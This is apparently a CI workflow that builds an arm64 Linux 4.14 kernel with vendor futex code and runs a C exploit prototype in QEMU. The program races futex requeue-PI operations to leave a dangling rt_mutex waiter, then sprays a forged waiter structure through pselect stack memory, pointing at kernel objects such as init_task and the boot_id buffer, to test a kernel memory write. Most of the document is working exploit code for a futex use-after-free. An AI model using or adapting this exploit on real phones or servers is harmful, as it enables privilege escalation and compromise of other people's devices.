name: qemu-ghostlock-v10

on:
  workflow_dispatch:

jobs:
  qemu-ghostlock:
    runs-on: ubuntu-24.04
    steps:
      - name: Checkout OPLUS futex sources (sparse)
        uses: actions/checkout@v4
        with:
          sparse-checkout: |
            kernel/futex.c
            kernel/locking/rtmutex.c
            kernel/locking/rtmutex_common.h
          sparse-checkout-cone-mode: false

      - name: Fetch generic 4.14.186
        run: |
          curl -sL https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.14.186.tar.xz -o k.tar.xz
          tar xJf k.tar.xz
          mv linux-4.14.186 linux-g

      - name: Swap in OPLUS futex/rtmutex
        run: |
          cp kernel/futex.c linux-g/kernel/futex.c
          cp kernel/locking/rtmutex.c linux-g/kernel/locking/rtmutex.c
          cp kernel/locking/rtmutex_common.h linux-g/kernel/locking/rtmutex_common.h
          echo "swap markers:"
          grep -c "rt_mutex_start_proxy_lock" linux-g/kernel/futex.c linux-g/kernel/locking/rtmutex.c

      - name: Instrument kernel (anchors + ghost delta)
        run: |
          python3 << 'PYEOF'
          # 1) globalize boot_id buffer in kernel/sysctl.c + add scratch + prints
          s = open('linux-g/kernel/sysctl.c').read()
          boot_name = None
          if 'static unsigned char sysctl_bootid' in s:
              boot_name = 'sysctl_bootid'
          elif 'static unsigned char boot_id' in s:
              boot_name = 'boot_id'
          assert boot_name, 'boot_id buffer not found'
          s = s.replace('static unsigned char %s' % boot_name,
                        'unsigned char ghostlock_bootid_%s' % boot_name)
          s = s.replace('&%s' % boot_name, '&ghostlock_bootid_%s' % boot_name)
          s = s.replace('#include <linux/kernel.h>',
                        '#include <linux/kernel.h>\nunsigned long ghostlock_scratch[8] __attribute__((aligned(64)));')
          open('linux-g/kernel/sysctl.c','w').write(s)
          print('sysctl.c patched, boot buffer:', boot_name)

          # 2) ghost delta prints: futex_wait_requeue_pi q.waiter
          f = open('linux-g/kernel/futex.c').read()
          needle = 'struct futex_q q;'
          if needle in f:
              f = f.replace(needle, needle + '\n\tpr_info("DBG q_waiter=%px\\n", &q.waiter);', 1)
          open('linux-g/kernel/futex.c','w').write(f)
          print('futex.c q_waiter print:', 'OK' if needle in f else 'WARN')

          # 3) stack_fds print in fs/select.c core_sys_select
          g = open('linux-g/fs/select.c').read()
          if 'unsigned long stack_fds' in g:
              g = g.replace('unsigned long stack_fds',
                            'unsigned long stack_fds', 1)
              g = g.replace('fds.in      = (unsigned long *)stack_fds;',
                            'pr_info("DBG stack_fds=%px\\n", stack_fds);\n\tfds.in      = (unsigned long *)stack_fds;', 1)
          open('linux-g/fs/select.c','w').write(g)
          print('select.c stack_fds print:', 'OK' if 'DBG stack_fds' in g else 'WARN')

          # 4) proxy lock + requeue markers (keep v9 instrumentation)
          reps = [
            ('return ret ? ret : task_count;',
             'pr_info("FUTEX-DBG requeue-end ret=%d task_count=%d\\n", ret, task_count);\n\treturn ret ? ret : task_count;'),
            ('ret = rt_mutex_start_proxy_lock(',
             'pr_info("FUTEX-DBG proxy_lock call\\n");\n\t\t\tret = rt_mutex_start_proxy_lock('),
          ]
          for a, b in reps:
              if a in f and b.split('\n')[0] not in f:
                  f = f.replace(a, b)
          open('linux-g/kernel/futex.c','w').write(f)
          print('futex instrumentation done')
          PYEOF

      - name: Install cross toolchain + qemu
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq gcc-aarch64-linux-gnu qemu-system-aarch64 cpio

      - name: Configure and build kernel
        run: |
          cd linux-g
          make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- defconfig
          scripts/config --enable CONFIG_FUTEX_PI
          scripts/config --enable CONFIG_RT_MUTEXES
          scripts/config --enable CONFIG_BLK_DEV_INITRD
          make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- olddefconfig
          make -j$(nproc) ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- Image > kbuild.log 2>&1 || {
            echo "=== BUILD FAILED, errors: ==="
            grep -E "error:|undefined reference" kbuild.log | head -30
            exit 1
          }
          echo "=== build OK ==="
          tail -3 kbuild.log
          ls -la arch/arm64/boot/Image
          grep -E " init_task$" System.map
          grep -E "ghostlock_bootid|ghostlock_scratch" System.map

      - name: Build static repro and init
        run: |
          cd linux-g
          INIT_TASK=$(grep ' init_task$' System.map | awk '{print $1}')
          BOOT_ID=$(grep 'ghostlock_bootid' System.map | awk '{print $1}')
          SCRATCH=$(grep 'ghostlock_scratch' System.map | awk '{print $1}')
          echo "INIT_TASK=$INIT_TASK BOOT_ID=$BOOT_ID SCRATCH=$SCRATCH"
          mkdir -p ../initramfs/proc ../initramfs/dev ../initramfs/sys
          cat > ../initramfs/repro.c << EOF
          #define _GNU_SOURCE
          #include <stdio.h>
          #include <stdint.h>
          #include <string.h>
          #include <errno.h>
          #include <unistd.h>
          #include <pthread.h>
          #include <sys/syscall.h>
          #include <linux/futex.h>
          #include <linux/sched.h>
          #include <sys/select.h>
          #include <time.h>
          #include <fcntl.h>
          #include <stdlib.h>

          #define ANCHOR_COMM   (${INIT_TASK}ULL + 0x7e0)
          #define ANCHOR_BOOTID  ${BOOT_ID}ULL
          #define ANCHOR_INIT    ${INIT_TASK}ULL
          #define ANCHOR_SCRATCH ${SCRATCH}ULL

          static long futex(uint32_t *uaddr, int op, uint32_t val,
                            const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3) {
            return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
          }
          static uint32_t f_wait, f_pi_target, f_pi_chain;
          static volatile int owner_has_target, waiter_has_chain, waiter_waiting,
                             owner_started, requeue_done, route_done, owner_chain_done,
                             ghost_go, consumer_done;
          static volatile int waiter_tid;
          static int word_shift = 0;

          static void read_bootid(unsigned char out[16]) {
            int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
            memset(out, 0, 16);
            if (fd >= 0) { char buf[64]; ssize_t n = read(fd, buf, sizeof(buf)-1);
              if (n > 0) { buf[n] = 0; unsigned char raw[16]; int nib=-1, o=0;
                for (ssize_t i=0; i<n && o<16; i++) { int v;
                  char c=buf[i];
                  v = (c>='0'&&c<='9')?c-'0':(c>='a'&&c<='f')?c-'a'+10:(c>='A'&&c<='F')?c-'A'+10:-1;
                  if (v<0) continue; if (nib<0){nib=v;continue;} raw[o++]=(unsigned char)((nib<<4)|v); nib=-1; }
                if (o==16) memcpy(out, raw, 16); }
              close(fd); }
          }

          static void *consumer_fn(void *a) {
            while (!ghost_go) usleep(1000);
            usleep(50000);
            struct sched_attr attr;
            memset(&attr, 0, sizeof(attr));
            attr.size = sizeof(attr);
            attr.sched_policy = SCHED_NORMAL;
            attr.sched_nice = 1;
            long r = syscall(SYS_sched_setattr, waiter_tid, &attr, 0);
            printf("REPRO consumer sched_setattr tid=%d ret=%ld errno=%d\n", waiter_tid, r, errno);
            consumer_done = 1;
            return NULL;
          }

          static void do_ghost_pselect(void) {
            int words_per_set = (320 + 63) / 64;
            int pipefd[2];
            pipe(pipefd);
            int block_fd = syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
            if (block_fd < 0) block_fd = pipefd[0];
            int high_read = fcntl(block_fd, F_DUPFD, 320 + 16);
            fd_set in, out, ex;
            FD_ZERO(&in); FD_ZERO(&out); FD_ZERO(&ex);
            unsigned long *bits;
            /* global word layout (WIKO rt_mutex_waiter 80B):
               0 tree_pc(comm) 1 tree_right(0) 2 tree_left(bootid)
               3 pi_pc(comm) 4 pi_right(0) 5 pi_left(bootid)
               6 task(init) 7 lock(scratch) 8 prio(130) 9 deadline(0) */
            struct { int w; unsigned long v; } words[] = {
              {0, ANCHOR_COMM}, {1, 0}, {2, ANCHOR_BOOTID},
              {3, ANCHOR_COMM}, {4, 0}, {5, ANCHOR_BOOTID},
              {6, ANCHOR_INIT}, {7, ANCHOR_SCRATCH}, {8, 130}, {9, 0},
            };
            for (unsigned i = 0; i < sizeof(words)/sizeof(words[0]); i++) {
              int gw = word_shift + words[i].w;
              int set_idx = gw / words_per_set;
              int w_idx = gw % words_per_set;
              if (set_idx == 0) { bits = (unsigned long *)&in; bits[w_idx] = words[i].v; }
              else if (set_idx == 1) { bits = (unsigned long *)&out; bits[w_idx] = words[i].v; }
              else if (set_idx == 2) { bits = (unsigned long *)&ex; bits[w_idx] = words[i].v; }
            }
            for (int fd = 0; fd < 320; fd++) {
              if (FD_ISSET(fd, &in) || FD_ISSET(fd, &out) || FD_ISSET(fd, &ex))
                dup2(high_read, fd);
            }
            dup2(high_read, 319);
            FD_SET(319, &ex);
            struct timespec ts = { .tv_sec = 3, .tv_nsec = 0 };
            printf("REPRO pselect enter shift=%d pid=%d\n", word_shift, getpid());
            ghost_go = 1;
            int r = pselect(320, &in, &out, &ex, &ts, NULL);
            printf("REPRO pselect ret=%d errno=%d shift=%d\n", r, errno, word_shift);
          }

          static void *waiter_fn(void *a) {
            waiter_tid = (int)syscall(SYS_gettid);
            long r = futex(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
            printf("REPRO waiter LOCK_PI chain ret=%ld errno=%d\n", r, errno);
            __sync_synchronize(); waiter_has_chain = 1;
            while (!owner_has_target) usleep(1000);
            struct timespec ts = { .tv_sec = 10 };
            __sync_synchronize(); waiter_waiting = 1;
            r = futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
            printf("REPRO waiter WAIT_REQUEUE_PI ret=%ld errno=%d\n", r, errno);
            do_ghost_pselect();
            __sync_synchronize(); route_done = 1;
            r = futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            printf("REPRO waiter UNLOCK_PI ret=%ld errno=%d\n", r, errno);
            while (!owner_chain_done) usleep(1000);
            return NULL;
          }

          static void *owner_fn(void *a) {
            long r = futex(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
            printf("REPRO owner LOCK_PI target ret=%ld errno=%d\n", r, errno);
            __sync_synchronize(); owner_has_target = 1;
            while (!waiter_has_chain) usleep(1000);
            __sync_synchronize(); owner_started = 1;
            r = futex(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
            printf("REPRO owner LOCK_PI chain ret=%ld errno=%d\n", r, errno);
            __sync_synchronize(); owner_chain_done = 1;
            sleep(60);
            return NULL;
          }

          int main(void) {
            unsigned char before[16], after[16];
            read_bootid(before);
            printf("REPRO bootid before: %02x%02x%02x%02x%02x%02x%02x%02x-%02x%02x%02x%02x%02x%02x%02x%02x\n",
                   before[0],before[1],before[2],before[3],before[4],before[5],before[6],before[7],
                   before[8],before[9],before[10],before[11],before[12],before[13],before[14],before[15]);
            pthread_t o, w, c;
            pthread_create(&o, NULL, owner_fn, NULL);
            usleep(200000);
            pthread_create(&w, NULL, waiter_fn, NULL);
            pthread_create(&c, NULL, consumer_fn, NULL);
            while (!waiter_waiting || !owner_started) usleep(1000);
            usleep(100000);
            long rq = -1;
            for (int i = 1; i <= 3; i++) {
              errno = 0;
              rq = futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
              printf("REPRO try=%d CMP_REQUEUE_PI ret=%ld errno=%d f_wait=%u\n", i, rq, errno, f_wait);
              if (errno == 35 || rq >= 1) break;
              sleep(1);
            }
            while (!route_done) usleep(10000);
            sleep(1);
            read_bootid(after);
            printf("REPRO bootid after:  %02x%02x%02x%02x%02x%02x%02x%02x-%02x%02x%02x%02x%02x%02x%02x%02x\n",
                   after[0],after[1],after[2],after[3],after[4],after[5],after[6],after[7],
                   after[8],after[9],after[10],after[11],after[12],after[13],after[14],after[15]);
            unsigned long long leaked = 0;
            for (int i = 0; i < 8; i++) leaked |= (unsigned long long)after[i] << (i*8);
            printf("REPRO leaked=%016llx expect_comm=%016llx\n", leaked, (unsigned long long)ANCHOR_COMM);
            printf("REPRO done\n");
            return 0;
          }
          EOF
          aarch64-linux-gnu-gcc -static -O2 -pthread ../initramfs/repro.c -o ../initramfs/repro
          cat > ../initramfs/init.c << 'EOF2'
          #include <sys/syscall.h>
          #include <sys/mount.h>
          #include <sys/reboot.h>
          #include <sys/stat.h>
          #include <unistd.h>
          #include <stdio.h>
          int main(void) {
            mkdir("/proc", 0755); mkdir("/dev", 0755); mkdir("/sys", 0755);
            syscall(SYS_mount, "proc", "/proc", "proc", 0, 0);
            syscall(SYS_mount, "devtmpfs", "/dev", "devtmpfs", 0, 0);
            syscall(SYS_mount, "sysfs", "/sys", "sysfs", 0, 0);
            printf("=== QEMU ghostlock v10 start ===\n");
            fflush(stdout);
            execl("/repro", "repro", NULL);
            printf("exec failed\n");
            syscall(SYS_reboot, 0xfee1dead, 672274793, 0x4321fedc, NULL);
            return 0;
          }
          EOF2
          aarch64-linux-gnu-gcc -static -O2 ../initramfs/init.c -o ../initramfs/init
          cd ../initramfs && find . | cpio -o -H newc | gzip > ../initramfs.cpio.gz
          ls -la ../initramfs.cpio.gz

      - name: Run QEMU test
        timeout-minutes: 6
        run: |
          timeout 240 qemu-system-aarch64 \
            -M virt -cpu cortex-a57 -m 512M -smp 4 -nographic -no-reboot \
            -kernel linux-g/arch/arm64/boot/Image \
            -initrd initramfs.cpio.gz \
            -append "console=ttyAMA0 earlycon rdinit=/init" > qemu.log 2>&1 || true
          echo "=== QEMU log (REPRO + DBG) ==="
          grep -E "REPRO|DBG|FUTEX-DBG" qemu.log | head -80
          echo "=== TAIL ==="
          tail -20 qemu.log

      - name: Upload QEMU log
        uses: actions/upload-artifact@v4
        with:
          name: qemu-ghostlock-v10-log
          path: qemu.log
